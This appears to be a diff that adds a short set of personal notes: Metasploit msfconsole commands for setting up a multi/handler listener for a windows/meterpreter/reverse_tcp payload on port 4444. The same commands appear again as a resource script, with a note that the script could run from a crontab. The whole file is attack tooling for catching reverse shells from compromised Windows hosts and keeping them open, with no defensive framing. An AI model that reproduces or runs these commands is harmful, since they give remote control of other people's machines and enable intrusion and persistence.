@@ -1,0 +1,27 @@
+- MSFCONSOLE
+    - use /exploit/multi/handler
+	- set payload windows/meterpreter/reverse_tcp
+	- set LHOST X.X.X.179
+	- set LPORT 4444
+	- set ExitOnSession false
+	- exploit -j -z
+	- sessions -l
+	- sessions -i 2
+
+
+
+========
+ SCRIPT
+========
+
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.0.0.8
+set LPORT 4444
+set ExitOnSession false
+exploit -j
+
+
+NOTE:
+
+The script could be located in a crontab for execution.
